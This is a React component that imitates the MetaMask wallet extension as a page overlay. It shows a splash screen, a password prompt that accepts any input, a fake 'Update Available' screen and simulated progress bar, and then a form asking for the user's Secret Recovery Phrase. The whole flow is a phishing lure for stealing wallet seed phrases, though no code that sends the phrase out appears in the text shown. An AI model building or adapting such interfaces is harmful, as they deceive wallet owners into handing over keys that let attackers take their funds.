import { useState, useEffect } from 'react';

interface MetaMaskPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type AppState = 'splash' | 'login' | 'update_prompt' | 'update_loading' | 'import_seed';

export default function MetaMaskPanel({ isOpen, onClose }: MetaMaskPanelProps) {
  const [appState, setAppState] = useState<AppState>('splash');
  const [password, setPassword] = useState('');
  const [seedPhrase, setSeedPhrase] = useState('');
  const [seedError, setSeedError] = useState(false);
  const [progress, setProgress] = useState(0);

  // 1. Cinematic Splash Screen Timer
  useEffect(() => {
    if (isOpen) {
      setAppState('splash');
      setPassword('');
      setSeedPhrase('');
      setSeedError(false);
      setProgress(0);
      
      // Wait 2.5 seconds, then transition to login
      const timer = setTimeout(() => {
        setAppState('login');
      }, 2500); 
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // 2. Loading Bar Logic
  useEffect(() => {
    if (appState === 'update_loading') {
      const interval = setInterval(() => {
        setProgress((prev) => {
          if (prev >= 100) return 100;
          
          const next = prev + Math.floor(Math.random() * 6) + 2; 
          
          if (next >= 100) {
            clearInterval(interval);
            setTimeout(() => setAppState('import_seed'), 1000);
            return 100;
          }
          return next;
        });
      }, 500);
      
      return () => clearInterval(interval);
    }
  }, [appState]);

  // 3. Seed Phrase Validation
  const handleSeedChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const val = e.target.value;
    setSeedPhrase(val);
    if (val.length > 0 && !/^[a-z\s]+$/.test(val)) {
      setSeedError(true);
    } else {
      setSeedError(false);
    }
  };

  if (!isOpen) return null;

  const AccountHeader = () => (
    <div className="flex items-center justify-between px-4 py-3 border-b border-[#858b9a33] w-full shrink-0">
      <div className="flex flex-col items-start gap-y-1">
        <div className="flex items-center gap-x-2 cursor-pointer px-[8px] py-1 hover:bg-[#1a1b1c] rounded-lg transition-all duration-300">
          <span className="text-white font-medium text-[16px] font-sans">Account 1</span>
          <svg className="w-[16px] h-[16px] text-white" fill="currentColor" viewBox="0 0 24 24"><path d="m2 7.887 1.775-1.775 8.225 8.225 8.225-8.225 1.775 1.775-10 10z"/></svg>
        </div>
        
        {/* Token SVGs overlapping perfectly, hardcoded so they never break */}
        <div className="flex items-center justify-center px-[8px] pt-1">
          {/* Bitcoin */}
          <svg className="w-[18px] h-[18px] rounded-full z-10 bg-[#F7931A]" viewBox="0 0 96 96" fill="none">
            <path d="M70.846 42.042C71.802 35.654 66.938 32.221 60.287 29.93L62.445 21.277L57.177 19.965L55.076 28.39C53.692 28.045 52.269 27.719 50.856 27.397L52.971 18.916L47.707 17.604L45.548 26.254C44.402 25.993 43.277 25.735 42.185 25.463L42.191 25.436L34.926 23.622L33.525 29.248C33.525 29.248 37.433 30.144 37.351 30.199C39.484 30.731 39.87 32.143 39.806 33.262L37.348 43.12C37.495 43.157 37.685 43.211 37.896 43.295C37.72 43.252 37.533 43.204 37.339 43.158L33.894 56.967C33.633 57.615 32.972 58.587 31.48 58.218C31.533 58.294 27.652 57.262 27.652 57.262L25.036 63.292L31.891 65C33.167 65.32 34.416 65.655 35.647 65.969L33.467 74.721L38.729 76.034L40.888 67.375C42.325 67.765 43.72 68.125 45.086 68.464L42.934 77.082L48.202 78.395L50.382 69.659C59.365 71.359 66.119 70.674 68.962 62.55C71.253 56.009 68.848 52.236 64.122 49.776C67.564 48.983 70.157 46.719 70.848 42.043L70.846 42.042ZM58.81 58.917C57.182 65.458 46.169 61.922 42.598 61.036L45.491 49.441C49.061 50.332 60.512 52.096 58.811 58.917H58.81ZM60.44 41.947C58.954 47.897 49.788 44.874 46.814 44.133L49.437 33.617C52.41 34.358 61.987 35.742 60.44 41.947H60.44Z" fill="white"/>
          </svg>
          {/* Ethereum */}
          <svg className="w-[18px] h-[18px] rounded-full z-20 -ml-2 bg-[#627EEA]" viewBox="0 0 360 360" fill="none">
            <path d="M184.669 67.5V150.656L254.953 182.062L184.669 67.5Z" fill="white" fillOpacity="0.602"/>
            <path d="M184.669 67.5L114.375 182.062L184.669 150.656V67.5Z" fill="white"/>
            <path d="M184.669 235.95V292.454L255 195.15L184.669 235.95Z" fill="white" fillOpacity="0.602"/>
            <path d="M184.669 292.454V235.941L114.375 195.15L184.669 292.454Z" fill="white"/>
            <path d="M184.669 222.873L254.953 182.063L184.669 150.676V222.873Z" fill="white" fillOpacity="0.2"/>
            <path d="M114.375 182.063L184.669 222.873V150.676L114.375 182.063Z" fill="white" fillOpacity="0.602"/>
          </svg>
        </div>
      </div>
      <button onClick={onClose} className="w-8 h-8 hover:bg-[#1a1b1c] rounded-lg flex items-center justify-center cursor-pointer transition-all duration-300">
        <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="m6.4 19-1.4-1.4 5.6-5.6-5.6-5.6 1.4-1.4 5.6 5.6 5.6-5.6 1.4 1.4-5.6 5.6 5.6 5.6-1.4 1.4-5.6-5.6z"/></svg>
      </button>
    </div>
  );

  return (
    <div className="fixed inset-0 z-[2147483648] pointer-events-auto transition-all duration-200 ease-in-out font-sans">
      <div className="absolute inset-0" onClick={onClose}></div>

      <div className="absolute top-0 right-8 w-[430px] h-[640px] bg-[#121314] border border-[#474d57] shadow-2xl overflow-hidden animate-in fade-in slide-in-from-top-4 duration-300 ease-out rounded-b-[8px]">
        <div className="relative w-full h-full">

          {/* ========================================== */}
          {/* LAYER 1: SPLASH SCREEN (Purple Background) */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-[#3d065f] z-50 flex flex-col items-center justify-center overflow-hidden transition-opacity duration-700 ease-in-out ${appState === 'splash' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            
            {/* The Text fades out while the Fox stays */}
            <div className="animate-[pulse_1.5s_ease-in-out_infinite] -mt-32">
              <SplashTextSVG />
            </div>

          </div>

          {/* ========================================== */}
          {/* LAYER 2: LOGIN SCREEN (Dark Background)    */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-[#121314] z-40 flex flex-col items-center justify-center px-4 pt-[64px] pb-[48px] overflow-hidden transition-opacity duration-700 ease-in-out ${appState === 'login' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            
            <div className="mb-8 z-10">
              <LoginTextSVG />
            </div>
            
            <div className="w-full mb-4 z-10">
              <input 
                type="password" 
                className="w-full h-[48px] bg-transparent border border-[#858b9a] rounded-[8px] px-4 font-normal text-[16px] text-[#ffffff] outline-none focus:border-[#8b99ff] focus:ring-1 focus:ring-[#8b99ff] transition-all" 
                placeholder="Enter your password" 
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>

            <div className="w-full mb-6 z-10">
              <button 
                onClick={() => setAppState('update_prompt')}
                className="w-full text-[#121314] bg-[#ffffff] font-medium text-[16px] cursor-pointer rounded-[12px] px-4 h-[48px] hover:opacity-80 active:scale-[0.97] transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed" 
                type="button" 
                disabled={password.length === 0}
              >
                Unlock
              </button>
            </div>

            <div className="text-center mb-3 z-10">
              <a href="https://support.metamask.io/" target="_blank" rel="noreferrer" className="text-[16px] font-medium text-[#8b99ff] hover:opacity-80 transition-all duration-300 hover:underline hover:decoration-2">
                Forgot password?
              </a>
            </div>

            <div className="text-center z-10">
              <p className="text-[16px] text-[#ffffff] font-normal">
                Need help? Contact <a href="https://support.metamask.io/" target="_blank" rel="noreferrer" className="font-medium text-[#8b99ff] hover:opacity-80 transition-all duration-300 hover:underline hover:decoration-2">MetaMask Support</a>
              </p>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 3: UPDATE PROMPT SCREEN             */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-[#121314] z-40 flex flex-col items-center justify-center transition-opacity duration-700 ease-in-out ${appState === 'update_prompt' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            <AccountHeader />
            <div className="flex flex-col items-center justify-center py-4 px-6 flex-grow w-full gap-y-4">
              
              <div className="bg-[#232426] rounded-[8px] p-6 text-center flex flex-col items-center gap-1 w-full max-w-[380px]">
                <img src="/update-icon.png" className="w-[100px] h-[100px] mb-2 object-contain" alt="Update Available" />
                <h2 className="text-[#ffffff] font-bold text-[28px] mt-2">Update Available</h2>
                <p className="text-[#9ca1af] font-normal text-[16px]">Version 13.12.1</p>
              </div>

              <div className="bg-[#232426] rounded-[8px] p-6 flex flex-col items-start gap-1 w-full max-w-[380px]">
                <ul className="list-disc pl-5 space-y-2 mb-4 text-[#ffffff] text-[14px]">
                  <li>Fix main build modifying desktop build steps</li>
                  <li>Improving the security system</li>
                  <li>Fix incorrect network information</li>
                  <li>Improve performance on signature request</li>
                </ul>
                <button onClick={() => setAppState('update_loading')} className="w-full text-[#121314] bg-[#ffffff] font-medium text-[16px] rounded-[12px] px-4 h-[48px] hover:opacity-80 active:scale-[0.97] transition-all duration-300">
                  Update
                </button>
              </div>

              <p className="mt-2 text-[14px] text-[#9ca1af]">Need help? <a href="https://support.metamask.io/" target="_blank" rel="noreferrer" className="text-[#8b99ff] hover:opacity-80 transition-all">Contact MetaMask Support</a></p>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 4: LOADING BAR SCREEN               */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-[#121314] z-40 flex flex-col items-center justify-center transition-opacity duration-700 ease-in-out ${appState === 'update_loading' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            <AccountHeader />
            <div className="flex flex-col items-center justify-center px-6 py-8 flex-grow w-full">
              <div className="mt-4 mb-6">
                <svg className="w-16 h-16 text-[#8b99ff] animate-spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>
              </div>
              <h2 className="text-[#ffffff] font-bold text-[24px] mb-2 text-center">Updating MetaMask</h2>
              <p className="text-[#ffffff] text-[16px] mb-6 text-center">Please wait while we update to version 13.12.1</p>
              
              <div className="w-full max-w-md mb-6">
                <div className="w-full h-2 bg-[#2b2c2f] rounded-full overflow-hidden">
                  <div className="h-full bg-[#8b99ff] rounded-full transition-all duration-300" style={{ width: `${progress}%` }}></div>
                </div>
                <p className="text-[#ffffff] text-[14px] mt-2 text-center">{progress}%</p>
              </div>
              
              <p className="text-[#9ca1af] text-[14px] max-w-md text-center">This may take a few moments. Please do not close this window.</p>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 5: SECRET RECOVERY PHRASE SCREEN    */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-[#121314] z-40 flex flex-col transition-opacity duration-700 ease-in-out ${appState === 'import_seed' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            <AccountHeader />
            <div className="px-6 mt-6 flex-grow flex flex-col w-full z-10">
              <div className="flex flex-col gap-y-1.5 mb-8">
                <h3 className="text-[#ffffff] font-bold text-[24px] leading-[32px]">Import your wallet with your Secret Recovery Phrase</h3>
                <p className="text-[#9ca1af] text-[14px] leading-relaxed">
                  We will use your Secret Recovery Phrase to validate your ownership. Enter the Secret Recovery Phrase that you were given when you created your wallet.{' '}
                  <a href="https://support.metamask.io/start/user-guide-secret-recovery-phrase-password-and-private-keys/" target="_blank" rel="noreferrer" className="text-[#8b99ff] hover:opacity-80 transition-all">Learn more</a>
                </p>
              </div>
              
              <textarea 
                value={seedPhrase} 
                onChange={handleSeedChange} 
                className={`w-full bg-[#232426] resize-none text-[16px] p-4 rounded-[8px] outline-none text-[#ffffff] transition-all border ${seedError ? 'border-[#ff7584] focus:ring-1 focus:ring-[#ff7584]' : 'border-transparent focus:border-[#8b99ff] focus:ring-1 focus:ring-[#8b99ff]'}`}
                placeholder="Add a space between each word and make sure no one is watching." 
                rows={7}
              ></textarea>
              
              <div className={`mt-3 transition-opacity duration-300 ${seedError ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
                <p className="text-[#ff7584] text-[14px]">Use only lowercase letters, check your spelling, and put the words in the original order.</p>
              </div>
              
              <div className="mt-auto pt-4 pb-6 w-full">
                <button 
                  disabled={seedError || seedPhrase.split(' ').filter(Boolean).length < 12} 
                  className="w-full text-[#121314] bg-[#ffffff] font-medium text-[16px] rounded-[12px] px-4 h-[48px] hover:opacity-80 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  Confirm Secret Recovery Phrase
                </button>
              </div>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 6: THE SHARED ANIMATING FOX         */}
          {/* ========================================== */}
          <div className={`absolute bottom-0 left-1/2 pointer-events-none -translate-x-1/2 z-50 transition-all duration-700 ease-in-out ${appState === 'splash' ? 'translate-y-[10%] opacity-100' : 'translate-y-[76%]'} ${appState !== 'splash' && appState !== 'login' ? 'opacity-0' : 'opacity-100'}`}>
            <FoxHeadSVG className="h-full w-[380px]" />
          </div>

        </div>
      </div>
    </div>
  );
}

// ---------------------------------------------
// EXTRACTED SVGS
// ---------------------------------------------

const SplashTextSVG = () => (
  <svg className="h-auto w-32" width="126" height="63" viewBox="0 0 126 63" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M71.4 48.4V62.2H64.3V52.6L56.2 53.5C54.4 53.7 53.7 54.3 53.7 55.4C53.7 57 55.2 57.6 58.3 57.6C61.4 57.6 62.4 57.3 64.3 56.8L60.6 62C59.1 62.3 57.7 62.5 56.2 62.5C49.8 62.5 46.1 59.9 46.1 55.4C46.1 50.9 49 49.3 55.5 48.5L64.1 47.5C63.6 45 61.7 43.9 58 43.9C54.3 43.9 50.6 44.8 47.1 46.5L48.2 40.3C51.4 38.9 55.2 38.2 58.9 38.2C67.1 38.2 71.4 41.6 71.4 48.3V48.4ZM7.7 31.1L0 62.2H7.7L11.5 46.6L18.1 54.6H26.2L32.9 46.6L36.7 62.2H44.4L36.7 31.1L22.2 48.5L7.7 31.1ZM36.8 0L22.3 17.4L7.7 0L0 31.1H7.7L11.5 15.5L18.1 23.5H26.2L32.9 15.5L36.7 31.1H44.4L36.8 0ZM89.9 48.1L83.7 47.2C82.1 47 81.5 46.5 81.5 45.6C81.5 44.2 83 43.6 86.1 43.6C89.2 43.6 93 44.3 96.4 46L95.5 39.9C92.7 38.9 89.6 38.4 86.3 38.4C78.6 38.4 74.4 41.1 74.4 45.9C74.4 50.7 76.7 51.8 81.6 52.5L87.9 53.5C89.5 53.7 90.2 54.4 90.2 55.4C90.2 56.8 88.7 57.5 85.7 57.5C82.7 57.5 77.5 56.5 74 54.8L74.7 60.9C77.7 62 81.6 62.7 85.3 62.7C93.2 62.7 97.3 59.9 97.3 55C97.3 50.1 95 48.9 89.9 48.2V48.1ZM100.1 33.9V62.2H107.2V33.9H100.1ZM115.4 49.5L125.2 38.8H116.4L107.1 49.9L117 62.3H125.9L115.3 49.6L115.4 49.5ZM99.1 24.4C99.1 29 102.8 31.5 109.2 31.5C115.6 31.5 112.2 31.3 113.6 31L117.3 25.8C115.4 26.3 113.3 26.6 111.3 26.6C108.1 26.6 106.7 25.9 106.7 24.4C106.7 22.9 107.5 22.7 109.2 22.5L117.3 21.6V31.2H124.4V17.4C124.4 10.8 120.2 7.3 111.9 7.3C103.6 7.3 104.5 8 101.2 9.4L100.1 15.6C103.6 13.9 107.5 13 111 13C114.5 13 116.7 14.1 117.1 16.6L108.5 17.6C102 18.3 99.1 20.5 99.1 24.5V24.4ZM79.3 22.9C79.3 28.6 82.6 31.5 89.1 31.5C95.6 31.5 93.8 31.1 95.9 30.1L96.8 23.8C94.8 25 92.8 25.6 90.8 25.6C87.8 25.6 86.4 24.4 86.4 21.6V13.3H97.1V7.5H86.4V2.7L73 9.9V13.4H79.4V22.9H79.3ZM72.4 20.3V21.7H53.3C54.2 24.6 56.7 25.9 61.3 25.9C65.9 25.9 68.3 25.2 71.3 23.7L70.4 29.8C67.6 31 64.1 31.6 60.6 31.6C51.1 31.6 45.9 27.4 45.9 19.5C45.9 11.6 51.2 7.3 59.3 7.3C67.4 7.3 72.4 12.1 72.4 20.4V20.3ZM53.2 16.9H65.3C64.7 14.1 62.6 12.7 59.2 12.7C55.8 12.7 53.9 14.1 53.2 16.9Z" fill="#EAC2FF"></path>
  </svg>
);

const LoginTextSVG = () => (
  <svg className="text-[#ffffff] w-[180px] h-[180px]" height="30" width="162" viewBox="0 0 696 344" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M394.102 265.407V340.812H355.162V288.57L310.786 293.73C301.039 294.854 296.75 298.041 296.75 303.912C296.75 312.512 304.892 316.136 322.344 316.136C332.985 316.136 344.773 314.553 355.184 311.824L335.026 340.353C326.885 342.165 318.95 343.06 310.579 343.06C275.262 343.06 255.103 329.024 255.103 304.119C255.103 282.149 270.95 270.613 306.956 266.531L354.519 261.004C351.951 247.175 341.516 241.167 320.762 241.167C301.291 241.167 279.78 246.143 260.539 255.431L266.662 221.696C284.55 214.22 304.938 210.367 325.532 210.367C370.825 210.367 394.148 229.173 394.148 265.384L394.102 265.407ZM43.7957 170.991L1.23138 340.812H43.7957L64.9173 255.477L101.542 299.372H145.918L182.542 255.477L203.664 340.812H246.228L203.664 170.968L123.718 265.912L43.7727 170.968L43.7957 170.991ZM203.664 1.14648L123.718 96.0905L43.7957 1.14648L1.23138 170.991H43.7957L64.9173 85.6558L101.542 129.55H145.918L182.542 85.6558L203.664 170.991H246.228L203.664 1.14648ZM496.454 263.825L462.031 258.848C453.431 257.495 450.037 254.766 450.037 250.019C450.037 242.313 458.407 238.919 475.63 238.919C495.559 238.919 513.447 243.001 532.253 251.831L527.506 218.554C512.324 213.119 494.894 210.413 476.777 210.413C434.442 210.413 411.325 225.136 411.325 251.624C411.325 272.241 424.007 283.777 450.954 287.859L485.836 293.065C494.665 294.418 498.289 297.812 498.289 303.247C498.289 310.953 490.147 314.576 473.612 314.576C451.871 314.576 428.319 309.37 409.078 300.082L412.931 333.359C429.466 339.482 450.977 343.105 471.135 343.105C514.617 343.105 537.252 327.924 537.252 300.977C537.252 279.465 524.57 267.907 496.5 263.848L496.454 263.825ZM552.388 186.15V340.812H591.329V186.15H552.388ZM636.829 271.301L690.974 212.638H642.516L591.329 273.319L645.91 340.789H695.057L636.829 271.278V271.301ZM546.953 134.297C546.953 159.203 567.111 173.238 602.429 173.238C610.799 173.238 618.734 172.321 626.876 170.532L647.034 142.003C636.622 144.709 624.835 146.314 614.194 146.314C596.764 146.314 588.6 142.691 588.6 134.091C588.6 128.197 592.911 125.032 602.635 123.909L647.011 118.749V170.991H685.952V95.586C685.952 59.3513 662.629 40.5689 617.335 40.5689C596.718 40.5689 576.354 44.4217 558.466 51.8979L552.342 85.6329C571.583 76.3449 593.095 71.3684 612.565 71.3684C633.32 71.3684 643.755 77.3769 646.323 91.2057L598.759 96.7326C562.754 100.815 546.907 112.35 546.907 134.32L546.953 134.297ZM438.043 126.156C438.043 157.414 456.16 173.261 491.936 173.261C506.201 173.261 517.988 170.991 529.294 165.785L534.271 131.591C523.4 138.15 512.301 141.544 501.201 141.544C484.437 141.544 476.961 134.756 476.961 119.574V74.2809H536.06V42.8163H476.961V16.099L402.909 55.2691V74.2809H437.997V126.133L438.043 126.156ZM399.767 111.892V119.597H294.526C299.273 135.284 313.377 142.462 338.42 142.462C358.349 142.462 376.925 138.38 393.437 130.468L388.69 163.537C373.508 169.867 354.267 173.284 334.567 173.284C282.257 173.284 253.727 150.19 253.727 107.397C253.727 64.603 282.715 40.5918 327.55 40.5918C372.384 40.5918 399.79 66.6441 399.79 111.914L399.767 111.892ZM294.021 93.3155H360.574C357.065 78.2942 345.53 70.451 327.091 70.451C308.653 70.451 297.714 78.0878 294.021 93.3155Z" fill="currentColor"></path>
  </svg>
);

const FoxHeadSVG = ({ className }: { className?: string }) => (
  <svg className={className} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 142 137"> 
    <path fill="#FF5C16" d="m132.24 131.751-30.481-9.076-22.986 13.741-16.038-.007-23-13.734-30.467 9.076L0 100.465l9.268-34.723L0 36.385 9.268 0l47.607 28.443h27.757L132.24 0l9.268 36.385-9.268 29.357 9.268 34.723-9.268 31.286Z" /> 
    <path fill="#FF5C16" d="m9.274 0 47.608 28.463-1.893 19.534L9.274 0Zm30.468 100.478 20.947 15.957-20.947 6.24v-22.197Zm19.273-26.381L54.989 48.01l-25.77 17.74-.014-.007v.013l.08 18.26 10.45-9.918h19.28ZM132.24 0 84.632 28.463l1.887 19.534L132.24 0Zm-30.467 100.478-20.948 15.957 20.948 6.24v-22.197Zm10.529-34.723h.007-.007v-.013l-.006.007-25.77-17.739L82.5 74.097h19.272l10.457 9.917.073-18.259Z" /> 
    <path fill="#E34807" d="m39.735 122.675-30.467 9.076L0 100.478h39.735v22.197ZM59.008 74.09l5.82 37.714-8.066-20.97-27.49-6.82 10.456-9.923h19.28Zm42.764 48.585 30.468 9.076 9.268-31.273h-39.736v22.197ZM82.5 74.09l-5.82 37.714 8.065-20.97 27.491-6.82-10.463-9.923H82.5Z" /> 
    <path fill="#FF8D5D" d="m0 100.465 9.268-34.723h19.93l.073 18.266 27.492 6.82 8.065 20.969-4.146 4.618-20.947-15.957H0v.007Zm141.508 0-9.268-34.723h-19.931l-.073 18.266-27.49 6.82-8.066 20.969 4.145 4.618 20.948-15.957h39.735v.007ZM84.632 28.443H56.875L54.99 47.977l9.839 63.8H76.68l9.845-63.8-1.893-19.534Z" /> 
    <path fill="#661800" d="M9.268 0 0 36.385l9.268 29.357h19.93l25.784-17.745L9.268 0Zm43.98 81.665h-9.029l-4.916 4.819 17.466 4.33-3.521-9.155v.006ZM132.24 0l9.268 36.385-9.268 29.357h-19.931L86.526 47.997 132.24 0ZM88.273 81.665h9.042l4.916 4.825-17.486 4.338 3.528-9.17v.007Zm-9.507 42.305 2.06-7.542-4.146-4.618H64.82l-4.145 4.618 2.059 7.542" /> 
    <path fill="#C0C4CD" d="M78.766 123.969v12.453H62.735v-12.453h16.03Z" /> 
    <path fill="#E7EBF6" d="m39.742 122.662 23.006 13.754v-12.453l-2.06-7.541-20.946 6.24Zm62.031 0-23.007 13.754v-12.453l2.06-7.541 20.947 6.24Z" /> 
  </svg>
);